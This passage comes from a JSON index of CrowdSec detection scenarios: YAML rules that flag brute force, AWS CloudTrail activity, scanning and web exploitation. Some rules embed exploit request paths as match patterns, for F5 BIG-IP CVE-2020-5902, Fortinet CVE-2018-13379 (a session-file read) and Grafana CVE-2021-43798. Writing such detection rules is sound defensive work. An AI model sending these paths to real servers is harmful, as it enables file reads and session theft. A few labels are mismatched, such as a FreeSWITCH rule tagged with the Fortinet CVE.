\"RejectVpcPeeringConnection\" ||\n     evt.Meta.event_name == \"AttachClassicLinkVpc\" ||\n     evt.Meta.event_name == \"DetachClassicLinkVpc\" ||\n     evt.Meta.event_name == \"DisableVpcClassicLink\" ||\n     evt.Meta.event_name == \"EnableVpcClassicLink\"\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1578\n     behavior: \"cloud:audit\"\n     label: \"AWS VPC change\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS VPC change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-vpc-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "03be2557184d98582fa9d460f45c73e67860926b8afbebea9737e2220e7ca54d"}, "0.2": {"digest": "ff3de61cf76336f3a9b87b8390172e9113ea3d92457845e29704fc114d8ec644"}, "0.3": {"digest": "dbaf2ca85f6d5129bb3ad9031559ce21b8a1eb844e3a614cb00c47f23dbfb803"}}}, "crowdsecurity/aws-cloudtrail-postexploit": {"content": "type: conditional\nname: crowdsecurity/aws-cloudtrail-postexploit\ndescription: \"postexploitation detection (noisy)\"\n#debug: true\ncapacity: -1\nleakspeed: 1m\ndistinct: evt.Meta.event_name\nfilter: evt.Meta.log_type == 'aws-cloudtrail'\ncondition: |\n  count(queue.Queue, #.Meta.event_name in [\"ListUserPolicies\", \"ListPolicies\", \"ListBuckets\", \"ListApplications\", \"DescribeInstances\", \"GetCallerIdentity\", \"GetFunctions\", \"DescribeAccountAttributes\", \"ListResources\"] or #.Meta.event_name startsWith \"ListFunctions\") > 2\nblackhole: 1m\nreprocess: true\ngroupby: evt.Meta.source_ip\nscope:\n  type: AwsARN\n  expression: evt.Meta.user_arn\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1087\n    - attack.T1526\n  behavior: \"cloud:audit\"\n  label: \"AWS post-exploitation detection\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "postexploitation detection (noisy)", "path": "scenarios/crowdsecurity/aws-cloudtrail-postexploit.yaml", "version": "0.3", "versions": {"0.1": {"digest": "66e1721989b0bca40bdf99b15be757138bdf9968153692618ada0a1df57d3131"}, "0.2": {"digest": "043c04b40049195eb4b64ee20f4273379b58b8937fdeaa538583ca31777f5b3e"}, "0.3": {"digest": "c42300373b23dd1d14b380c8ef7fbc491ac431726353f7142a1ecea1db1df4a3"}}}, "crowdsecurity/aws-nwo-login": {"content": "# NWD/NWH AWS console login\ntype: trigger\nname: crowdsecurity/aws-cloudtrail-nwo-nwd-console-login\ndescription: \"Detect console login outside of office hours\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  (evt.Meta.event_name == 'ConsoleLogin' || evt.Meta.event_name == 'GetSessionToken' || evt.Meta.event_name == 'GetFederationToken') &&\n  evt.Unmarshaled.cloudtrail.responseElements?.ConsoleLogin == 'Success' &&\n  (\n   (evt.Time.Hour() >= 18 || evt.Time.Hour() < 6) || \n   (evt.Time.Weekday().String() == 'Saturday' || evt.Time.Weekday().String() == 'Sunday')\n  )\ngroupby: evt.Meta.source_ip\nscope:\n  type: AwsARN\n  expression: evt.Meta.user_arn\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1078\n  behavior: \"cloud:unusual-activity\"\n  label: \"AWS bruteforce\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect console login outside of office hours", "path": "scenarios/crowdsecurity/aws-nwo-login.yaml", "version": "0.4", "versions": {"0.1": {"digest": "f093c51096d55419851635001ec2c2e31fbbc1453286237d1d6229ec1bcc6808"}, "0.2": {"digest": "d0e55e36721acc0280dffa4759e1f0f5e51d59864c5055fdc326eff851cae608"}, "0.3": {"digest": "ec5be63c7781960eadca9f774b2ea4e2461c8615741c5f039f3bc48bcd594b91"}, "0.4": {"digest": "09ef326dcdf808760c146ff2e5078245666b247c3023f30fb6f03cf27f8a0b3d"}}}, "crowdsecurity/ban-defcon-drop_range": {"content": "#TAP IT TWICE : if more than 5 unique IPs of a range are being banned, drop the range\ntype: leaky\n#debug: true\nname: crowdsecurity/ban-defcon-drop_range\ndescription: \"Ban a range if more than 5 ips from it are banned at a time\"\n#it's an overflow from a scenario that triggered a remediation ;)\nfilter: \"evt.GetType() == 'overflow' && evt.Overflow.Alert.Remediation == true\"\ngroupby: \"evt.Overflow.Alert.Source.Range\"\ndistinct: \"evt.Overflow.Alert.Source.IP\"\ncapacity: 5\nleakspeed: \"1m\"\nblackhole: 5m\nlabels:\n remediation: true\nscope:\n type: Range\n\n", "description": "Ban a range if more than 5 ips from it are banned at a time", "path": "scenarios/crowdsecurity/ban-defcon-drop_range.yaml", "version": "0.2", "versions": {"0.1": {"digest": "da839847a4a67c1787ea5185e2b25e1e26710ac3b12e7c179a9bdda8a99b2009"}, "0.2": {"digest": "e1068cba1ce38cc0c3b82b195e91b560e8675ae789c451bbef5c5b4aff1aff02"}}}, "crowdsecurity/configserver-lfd-bf": {"content": "type: trigger\nname: crowdsecurity/configserver-lfd-bf\ndescription: \"Detects SSH bruteforce attempts blocked by ConfigServer.\"\nfilter: \"evt.Parsed.program == 'lfd'\"\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  service: ssh\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  label: \"SSH Bruteforce\"\n  behavior: \"ssh:bruteforce\"\n  remediation: true\n\n", "description": "Detects SSH bruteforce attempts blocked by ConfigServer.", "path": "scenarios/crowdsecurity/configserver-lfd-bf.yaml", "version": "0.1", "versions": {"0.1": {"digest": "5752cf0e3b12356803e6a3d0a2a97dd89ec3266b4ce0b49d48f6bfe5980ee5bc"}}}, "crowdsecurity/cpanel-bf": {"content": "type: leaky\nname: crowdsecurity/cpanel-bf\ncapacity: 5\nleakspeed: 10s\ndescription: \"Detect bruteforce on cpanel login\"\nfilter: \"evt.Meta.log_type == 'auth_bf_log'\"\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n   - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"cPanel Bruteforce\"\n  service: cpanel\n  remediation: true\n\n", "description": "Detect bruteforce on cpanel login", "path": "scenarios/crowdsecurity/cpanel-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "120b1820b330939330df55df5da536cbe0885c9df11a2a0986fe80197be68981"}, "0.2": {"digest": "25d6094169ab75c028f7d35e0b5bacf9ecf24e46484826c95405966562a2db0c"}, "0.3": {"digest": "de1e8f9f8b442ad1a83a61d19a13af18821475e69086940d6521fdd6751753e2"}, "0.4": {"digest": "a3216ec3c67bcfebd411b5c1240cd0fccb52d854031611fb1048f963ac91c26e"}}}, "crowdsecurity/cpanel-bf-attempt": {"content": "type: trigger\nname: crowdsecurity/cpanel-bf-attempt\ndescription: \"Detect bruteforce attempt on cpanel login\"\nfilter: \"evt.Meta.log_type == 'auth_bf_attempt'\"\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"cPanel Bruteforce\"\n  service: cpanel\n  remediation: true", "description": "Detect bruteforce attempt on cpanel login", "path": "scenarios/crowdsecurity/cpanel-bf-attempt.yaml", "version": "0.3", "versions": {"0.1": {"digest": "6b7b084a9a5ea68ade56b6bd171cfed65cc661b63b197a0f3cec2aef2fcdaeca"}, "0.2": {"digest": "fa0b71d88fe4a96298bea7caadb858795ad091656907e3f94223d12f98b91715"}, "0.3": {"digest": "c39220845d2f4df0519a620b3f92d8a54f7b81d9da9c34c460aca7ff5b9331a0"}}}, "crowdsecurity/crowdsec-appsec-inband": {"content": "type: leaky\nfilter: evt.Meta.log_type == 'appsec-block' && evt.Parsed.action in [\"deny\", \"drop\"]\n#debug: true\nname: crowdsecurity/crowdsec-appsec-inband\ndescription: IP has triggered multiples InBand CrowdSec appsec rules\nblackhole: 1m\nleakspeed: 30s\ncapacity: 1\ngroupby: evt.Meta.source_ip\ndistinct: evt.Appsec.GetName()\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n   - attack.T1190\n  behavior: \"http:exploit\"\n  label: \"Triggered multiple InBand CrowdSec AppSec rules\"\n  service: http\n  remediation: true\n", "description": "IP has triggered multiples InBand CrowdSec appsec rules", "path": "scenarios/crowdsecurity/crowdsec-appsec-inband.yaml", "version": "0.5", "versions": {"0.1": {"digest": "bf202b09575fe406d17ff9cf267cfc81d228bc0575038a8ae91a137ed4405b58"}, "0.2": {"digest": "0d0bcfec8fb567aa86271f3e5c45feb16c6091f2c52c32db629117b0bba0e793"}, "0.3": {"digest": "71213c8536a1e04b36fe2e207ffec099982e78cf7d3ed6a8ecd26440f47cb1c0"}, "0.4": {"digest": "c613b7b73047d0038fb7c2125bf1839c59b0705f4d6f24a87318bc05e0f5a7e2"}, "0.5": {"digest": "f18ebf810d259686b068a00ddbe749ea6c6a6288aab1b14f259ec6c9ab67cff3"}}}, "crowdsecurity/crowdsec-appsec-outofband": {"content": "type: leaky\nfilter: evt.Parsed.source == 'crowdsec-appsec' && evt.Appsec.HasOutBandMatches == true && evt.Parsed.outofband_action in [\"deny\", \"drop\"]\nname: crowdsecurity/crowdsec-appsec-outofband\ndescription: IP has made more than 5 requests that triggered out-of-band appsec rules\nblackhole: 2m\nleakspeed: 30s\ncapacity: 5\nlabels:\n  type: exploit\n  behavior: \"http:exploit\"\n  remediation: true\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1190\n  label: \"Triggered multiple OutOfBand CrowdSec AppSec rules\"\n  service: http\ngroupby: \"evt.Meta.source_ip\"\n#---\n# at least requests blocked on 3 distinct URIs\n#type: leaky\n#filter: evt.Parsed.source == 'crowdsec-appsec' && evt.Appsec.HasOutBandMatches == true && evt.Parsed.outofband_action in [\"deny\", \"drop\"]\n#name: crowdsecurity/waf-probing\n#description: \"WAF probing\"\n#blackhole: 2m\n#leakspeed: 60s\n#capacity: 5\n#groupby: \"evt.Meta.source_ip + evt.Parsed.target_uri\"\n#labels:\n#  type: exploit\n#  remediation: true\n", "description": "IP has made more than 5 requests that triggered out-of-band appsec rules", "path": "scenarios/crowdsecurity/crowdsec-appsec-outofband.yaml", "version": "0.7", "versions": {"0.1": {"digest": "1e9a7f01a451b2322f1125b0dfba3c5cdd3dca53e69eb38f245a3e25af6952df"}, "0.2": {"digest": "59393376cbcfb85cd7e609c5fe2c958aa60c519d7ff0ee310f1bab2af01d38e9"}, "0.3": {"digest": "47b3cd0887f58785c2b6a064f4da46e36a17a6e7d34c4893b0bd8308271fe0be"}, "0.4": {"digest": "206efc8015d2f6de4873b9f7609906f5763663977922e417a22a81601bc9da81"}, "0.5": {"digest": "a2dea8ad3253e1327c9cbdc65f5274103c0d7d5ea62a4b05f32328613de1823f"}, "0.6": {"digest": "fa8a0be4a84025d48efb6ae640176571e3128c63b7716febfa6ae108b36f3818"}, "0.7": {"digest": "83cd152ed3078d3ed8153bb273bb1187e1210546ff2a584794637153220f909f"}}}, "crowdsecurity/dovecot-spam": {"content": "#contribution by @ltsich\ntype: leaky\nname: crowdsecurity/dovecot-spam\ndescription: \"Detect Dovecot bruteforce\"\ndebug: false\nfilter: \"evt.Meta.log_type == 'dovecot_logs' && evt.Meta.dovecot_login_result == 'auth_failed'\"\ngroupby: evt.Meta.source_ip\ncapacity: 3\nleakspeed: \"360s\"\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Dovecot Bruteforce\"\n  service: dovecot\n  remediation: true\n", "description": "Detect Dovecot bruteforce", "path": "scenarios/crowdsecurity/dovecot-spam.yaml", "version": "0.6", "versions": {"0.1": {"digest": "fc1429f0c8d5b1ba20660ac0725fe0b52bb0382efa746e9bd962d80bdf7c9310"}, "0.2": {"digest": "e3feff9a377f6b7e72a29910d6ebfee52436163767f876d21b41e2ae2e9618b2"}, "0.3": {"digest": "c350f1a24a7ff5aed8902691a1bf67b08e963a013dffc3e2500c9db61ad6b62e"}, "0.4": {"digest": "8c5fd647e5f2ad29620b0dc37c5221a4b6f6a24bf443b55837ebcac290ecf17c"}, "0.5": {"digest": "8151d0ea27afdabc547503cbcf2f878a7a553479162b1eff2d31fcd77bffb3c4"}, "0.6": {"digest": "a3992700fdf067a69ed04776b7e841a79388179e340ef074688c0172d37c0449"}}}, "crowdsecurity/endlessh-bf": {"content": "# endlessh bruteforce\ntype: leaky\nname: crowdsecurity/endlessh-bf\ndescription: \"Detect SSH bruteforce caught by Endlessh\"\nfilter: \"evt.Meta.log_type == 'endlessh_accept'\"\nleakspeed: \"5m\"\nreferences:\n  - http://wikipedia.com/ssh-bf-is-bad\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 120m\nreprocess: true\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"ssh:bruteforce\"\n  label: \"Endlessh Bruteforce\"\n  service: endlessh\n  remediation: true\n", "description": "Detect SSH bruteforce caught by Endlessh", "path": "scenarios/crowdsecurity/endlessh-bf.yaml", "references": ["http://wikipedia.com/ssh-bf-is-bad"], "version": "0.3", "versions": {"0.1": {"digest": "2113a6f5e8e2d675581e93d4bcf546526d0bd22aaa35ecafdd041d95e3f3422d"}, "0.2": {"digest": "b241bc0364aeed20ee30fb8d2ee2b748b71751592a89c9e86eaf4f6a49a25bcb"}, "0.3": {"digest": "6291aad0e47390f308dd859747e9044242df3c8f8c526beaae37fbd960e4d8aa"}}}, "crowdsecurity/exchange-bf": {"content": "type: leaky\nname: crowdsecurity/exchange-bf\ndescription: \"Detect Exchange bruteforce (SMTP,IMAP,POP3)\"\nfilter: evt.Meta.service == 'exchange' && evt.Meta.sub_type == 'auth_fail'\ngroupby: evt.Meta.source_ip\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Microsoft Exchange Bruteforce\"\n  remediation: true\n  service: exchange\n", "description": "Detect Exchange bruteforce (SMTP,IMAP,POP3)", "path": "scenarios/crowdsecurity/exchange-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "7900671abf67cdc000b2dd68d0da35a0960e07f4ac3505fdd4d78f929c29a238"}, "0.2": {"digest": "8d67052a1fc4e5b48be549165ed6ea47aebaa154960166828fd8b114a6ba5bd0"}, "0.3": {"digest": "51d223031a71e4215a9ffe78feec7f855a493f8e00e6e760c15aa38915a98bef"}, "0.4": {"digest": "1618d565cba5af16afc95581b0ac5f9cc3fabd11d23cc557db7e03dc8d190959"}}}, "crowdsecurity/exim-bf": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/exim-bf\ndescription: \"Detect Exim brute force\"\nfilter: \"evt.Meta.log_type == 'exim_failed_auth'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Exim Bruteforce\"\n  remediation: true\n  service: smtp\n---\ntype: leaky\n#debug: true\nname: crowdsecurity/exim-user-bf\ndescription: \"Detect Exim user email brute force\"\nfilter: \"evt.Meta.log_type == 'exim_failed_auth'\"\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.username\ncapacity: 5\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"pop3/imap:bruteforce\"\n  label: \"Exim Bruteforce\"\n  remediation: true\n  service: smtp\n", "description": "Detect Exim brute force", "path": "scenarios/crowdsecurity/exim-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "a5e177acbd8bbc3a6330100dc64aaebc14f5915a1dda3a8115e54f8825227e7b"}, "0.2": {"digest": "7f3433d01cf835eced84072ce8475e650740aec6300637757a47a4800a4d846e"}, "0.3": {"digest": "ed16960edefc234b6d1685db4b7cb831fbea29f65115e28ab703c7cb721cb681"}}}, "crowdsecurity/exim-spam": {"content": "type: leaky\nname: crowdsecurity/exim-spam\ndescription: \"Detect spam on Exim\"\n#debug: true\nfilter: \"evt.Meta.log_type == 'spam-attempt' && evt.Meta.service == 'exim'\"\ngroupby: evt.Meta.source_ip\ncapacity: 3\nleakspeed: \"360s\"\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  behavior: \"smtp:spam\"\n  label: \"Exim Spam\"\n  remediation: true\n  service: smtp\n", "description": "Detect spam on Exim", "path": "scenarios/crowdsecurity/exim-spam.yaml", "version": "0.3", "versions": {"0.1": {"digest": "b556e7f5a75118639d28765e93ae858bfa5416b8e73142c5b318bfda8ca1ae6e"}, "0.2": {"digest": "d679e96623139ba186423cbdc3bdb4d98baf33811321cad0a8d2b6d4895dcc44"}, "0.3": {"digest": "a7c7435313a9225cb4003f8fb924c3bf19a6fe21c2c69b29814a4d421c63ade7"}}}, "crowdsecurity/f5-big-ip-cve-2020-5902": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/f5-big-ip-cve-2020-5902\ndescription: \"F5 BIG-IP TMUI - RCE (CVE-2020-5902)\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    (\n    Upper(evt.Meta.http_path) matches Upper('/tmui/login.jsp/..;/tmui/[^.]+.jsp\\\\?(fileName|command|directoryPath|tabId)=')\n    or\n    Upper(evt.Meta.http_path) matches Upper('/tmui/login.jsp/%2E%2E;/tmui/[^.]+.jsp\\\\?(fileName|command|directoryPath|tabId)=')\n    )\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2020-5902\n  behavior: \"http:exploit\"\n  label: \"F5 BIG-IP TMUI - RCE\"\n  remediation: true\n  service: f5\n", "description": "F5 BIG-IP TMUI - RCE (CVE-2020-5902)", "path": "scenarios/crowdsecurity/f5-big-ip-cve-2020-5902.yaml", "version": "0.3", "versions": {"0.1": {"digest": "04def871dad424adf0227232c8b22acab9938901a879dca070b58e2389039326"}, "0.2": {"digest": "8c8c704906bc05d7b9e40f9d99e3d85d5084fd462d99dea74b0687ab1268eb97"}, "0.3": {"digest": "1cc77072a5c02205544e917f6b9d1e3e9674bcfba8fa31ad6742d20fb6b3375a"}}}, "crowdsecurity/fortinet-cve-2018-13379": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/fortinet-cve-2018-13379\ndescription: \"Detect cve-2018-13379 exploitation attemps\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    Upper(evt.Meta.http_path) contains Upper('/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2018-13379\n  behavior: \"http:exploit\"\n  label: \"CVE-2018-13379\"\n  remediation: true\n  service: fortinet\n", "description": "Detect cve-2018-13379 exploitation attemps", "path": "scenarios/crowdsecurity/fortinet-cve-2018-13379.yaml", "version": "0.3", "versions": {"0.1": {"digest": "c966840446a481f46237df14963224a106cd15e8b7c72dc903de1ae098dbb58d"}, "0.2": {"digest": "a7952444f7fc5d039bc415c5e56baa8243badd1bcc4013e8d8e52bc6c2e1a431"}, "0.3": {"digest": "719602d5447335d3a176aebfd60b8246a7e166656e278f5b10f557cf3b5a218d"}}}, "crowdsecurity/fortinet-vpn-bruteforce": {"content": "type: leaky\nname: crowdsecurity/fortinet-vpn-bruteforce\ndescription: \"Detect fortinet VPN bruteforce\"\ndebug: false\nfilter: \"evt.Meta.service == 'fortinet' && evt.Meta.sub_type == 'vpn' && evt.Meta.action == 'ssl-login-fail' && evt.Meta.tunnel_type == 'ssl-web'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 2m\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"Fortinet VPN Bruteforce\"\n  service: fortinet\n  remediation: true\n", "description": "Detect fortinet VPN bruteforce", "path": "scenarios/crowdsecurity/fortinet-vpn-bruteforce.yaml", "version": "0.1", "versions": {"0.1": {"digest": "e31525a3301785fd8591c77482d4fabe1207f382eb94a1775645361286241cc0"}}}, "crowdsecurity/freeswitch-acl-reject": {"content": "type: leaky\nname: crowdsecurity/freeswitch-acl-reject\ndescription: \"Detect freeswitch acl rejects\"\nfilter: \"evt.Meta.service == 'freeswitch' && evt.Meta.sub_type == 'acl_reject'\"\nleakspeed: \"10s\"\ncapacity: 15\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n  behavior: \"http:exploit\"\n  label: \"CVE-2018-13379\"\n  remediation: true\n  service: freeswitch\n", "description": "Detect freeswitch acl rejects", "path": "scenarios/crowdsecurity/freeswitch-acl-reject.yaml", "version": "0.2", "versions": {"0.1": {"digest": "947017331043b3e4c7a600d2bc7e9b40262ffdcd290389ef9cd0b0877a1fe4a7"}, "0.2": {"digest": "d8cb04c939b4e6e3eb315cd90535b5adec9368dada292602feb184f57a2db20d"}}}, "crowdsecurity/freeswitch-bf": {"content": "type: leaky\nname: crowdsecurity/freeswitch-bf\ndescription: \"Detect freeswitch auth bruteforce\"\nfilter: \"evt.Meta.service == 'freeswitch' && evt.Meta.sub_type == 'auth_failure'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: freeswitch\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"generic:bruteforce\"\n  label: \"Freeswitch Bruteforce\"\n  remediation: true\n\n---\ntype: leaky\nname: crowdsecurity/freeswitch-slow-bf\ndescription: \"Detect freeswitch auth bruteforce\"\nfilter: \"evt.Meta.service == 'freeswitch' && evt.Meta.sub_type == 'auth_failure'\"\nleakspeed: \"1m\"\ncapacity: 20\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: freeswitch\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"generic:bruteforce\"\n  label: \"Freeswitch Bruteforce\"\n  remediation: true\n", "description": "Detect freeswitch auth bruteforce", "path": "scenarios/crowdsecurity/freeswitch-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "de4be679bd6d04d4b06bcd45ce6dad21689f9ffb92c9ddc66a9f3fa50add8300"}, "0.2": {"digest": "ba040ff32f6d9c6a340276ff6dfa4e8d60f1f9a8e861368e3500d23197c06115"}, "0.3": {"digest": "adfa04c9a278a4609002a5e1be19f77b7f98f60e5b6a5d5a5d47d4af6201e9fc"}}}, "crowdsecurity/freeswitch-user-enumeration": {"content": "type: leaky\nname: crowdsecurity/freeswitch-user-enumeration\ndescription: \"Detect freeswitch user enumeration\"\nfilter: \"evt.Meta.service == 'freeswitch' && evt.Meta.sub_type == 'user_enumeration'\"\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nlabels:\n  service: freeswitch\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  behavior: \"generic:bruteforce\"\n  label: \"Freeswitch User Enumeration\"\n  remediation: true\n---\ntype: leaky\nname: crowdsecurity/freeswitch-user-enumeration\ndescription: \"Detect freeswitch user enumeration\"\nfilter: \"evt.Meta.service == 'freeswitch' && evt.Meta.sub_type == 'user_enumeration'\"\nleakspeed: \"1m\"\ncapacity: 20\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nlabels:\n  service: freeswitch\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1589\n  behavior: \"generic:bruteforce\"\n  label: \"Freeswitch User Enumeration\"\n  remediation: true\n", "description": "Detect freeswitch user enumeration", "path": "scenarios/crowdsecurity/freeswitch-user-enumeration.yaml", "version": "0.4", "versions": {"0.1": {"digest": "826b44367faa41e39a224ffdae5c4e9824d7f1e157dd67d24e97e785c7478922"}, "0.2": {"digest": "05d37cdecfac483f944e249b358d24f3c7e75292a1b4465d71d3994004e1548d"}, "0.3": {"digest": "435670ee2f37b2f2d4918e282566c2cd97b6c79e94d488f8052ee351fdd14176"}, "0.4": {"digest": "ff39e7af21a00ad4b66512a3a2364e2f6578c6f95e770e41edf54dc21c336bc7"}}}, "crowdsecurity/grafana-cve-2021-43798": {"content": "type: trigger\nformat: 2.0\nname: crowdsecurity/grafana-cve-2021-43798\ndescription: \"Grafana - Arbitrary File Read (CVE-2021-43798)\"\nfilter: |\n  evt.Meta.log_type in [\"http_access-log\", \"http_error-log\"] and \n    (Upper(evt.Meta.http_path) matches '/PUBLIC/PLUGINS/[^/]+/../[./]+/'\n    or\n    Upper(evt.Meta.http_path) matches '/PUBLIC/PLUGINS/[^/]+/%2E%2E/[%2E/]+/')\ngroupby: \"evt.Meta.source_ip\"\nblackhole: 2m\nlabels:\n  service: grafana\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1190\n    - attack.T1595\n    - cve.CVE-2021-43798\n  behavior: \"http:exploit\"\n  label: \"Grafana - LFI\"\n  remediation: true\n", "description": "Grafana - Arbitrary File Read (CVE-2021-43798)", "path": "scenarios/crowdsecurity/grafana-cve-2021-43798.yaml", "version": "0.3", "versions": {"0.1": {"digest": "38e2367afa09fce19313601b205c7ef60ff0dcda0d5a5fbfe162d391998727cf"}, "0.2": {"digest": "6fbaa53ca18c5826185024bce25c34e850508bf5bde27b90343938766b3a19e1"}, "0.3": {"digest": "e0945fcf280fc340a3b8a3d1414352845a7e3b8fedefdc8b3fd4fa5d0a0862e8"}}}, "crowdsecurity/home-assistant-bf": {"content": "# home-assistant bruteforce\ntype: leaky\n#debug: true\nname: crowdsecurity/home-assistant-bf\ndescription: \"Detect Home Assistant bruteforce\"\nfilter: evt.Meta.log_type == 'home-assistant_failed_auth'\nleakspeed: \"10s\"\ncapacity: 5\ngroupby: evt.Meta.source_ip\nblackhole: 5m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"iot:bruteforce\"\n  label: \"Home Assistant Bruteforce\"\n  service: home-assistant\n  remediation: true\n", "description": "Detect Home Assistant bruteforce", "path": "scenarios/crowdsecurity/home-assistant-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "7e155354a1558caba3896dc0af3ad311db2e4df90ea20d7809c288fd080b0356"}, "0.2": {"digest": "fb78b93bb62bf525357967eb64cfbca6ca315cec23288bc4e7e2272a82381770"}, "0.3": {"digest": "c0062c2ba368d81ed47dcc7fc8ac1b895363f69c4d8489ff40f284ce8d24c0ce"}, "0.4": {"digest": "bb026beac65c1abe6a18722d69112c93f1ff68cd0b4816cc357c07166d0e07aa"}}}, "crowdsecurity/http-admin-interface-probing": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/http-admin-interface-probing\ndescription: \"Detect generic HTTP admin interface probing\"\nfilter: |\n  evt.Meta.service == 'http' and \n  evt.Meta.log_type in ['http_access-log', 'http_error-log'] and \n  evt.Meta.http_status in ['404', '403'] and\n  any(File(\"admin_interfaces.txt\"), { Lower(evt.Meta.http_path) contains #})\ngroupby: evt.Meta.source_ip\ndistinct: \"evt.Meta.http_path\"\ndata:\n  - source_url: https://hub-data.crowdsec.net/web/admin_interfaces.txt\n    dest_file: admin_interfaces.txt\n    type: string\ncapacity: 2\nleakspeed: \"10s\"\nblackhole: 1m\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1595\n  behavior: \"http:scan\"\n  label: \"HTTP Admin Interface Probing\"\n  service: http\n  remediation: true\n", "description": "Detect generic HTTP admin interface probing", "path": "scenarios/crowdsecurity/http-admin-interface-probing.yaml", "version": "0.5", "versions": {"0.1": {"digest": "da30d0a724e7874293e38af9fd0c14b19c1d2c6334c5e480a2de9933c2d6f2d2"}, "0.2": {"digest": "2844d6e92ee410808eac6d5ad546026423bf404a334a1ef9966f763fccff8a07"}, "0.3": {"digest": "abcef6c7b98afd73df9ca94a8e8461af5e74f074a6bb46f978109750de64ab55"}, "0.4": {"digest": "63f3fd06df3aaa0d1b6c6fec359e029d332ddf59b380c61d4e733750df1744b1"}, "0.5": {"digest": "a8b0428674913507f3a356bba0e17541df731682dd2376a5495c4c76a60b8813"}}}, "crowdsecurity/http-apiscp-bf": {"content": "type: leaky\nname: crowdsecurity/http-apiscp-bf\ndescription: \"detect apisCP dashboard bruteforce\"\ndebug: false\n# success auth on apisCP returns 303\nfilter: \"evt.Meta.log_type == 'http_access-log' && evt.Meta.http_path startsWith '/apps/login' && evt.Parsed.verb == 'POST' && evt.Meta.http_status == '200'\"\ngroupby: evt.Meta.source_ip\ncapacity: 5\nleakspeed: 10s\nblackhole: 5m\nlabels:\n  service: apisCP\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"http:bruteforce\"\n  label: \"apisCP bruteforce\"\n  remediation: true\n", "description": "detect apisCP dashboard bruteforce", "path": "scenarios/crowdsecurity/http-apiscp-bf.yaml", "version": "0.3", "versions": {"0.1": {"digest": "c0dec456fded0c14c7c48a918eb30e1ab35892581adb9263572cfa49fddc908e"}, "0.2": {"digest": "f6f5ed461e46ff730a57ae5bc2ee9187cdca20d0d5e13114fed8e381e384528b"}, "0.3": {"digest": 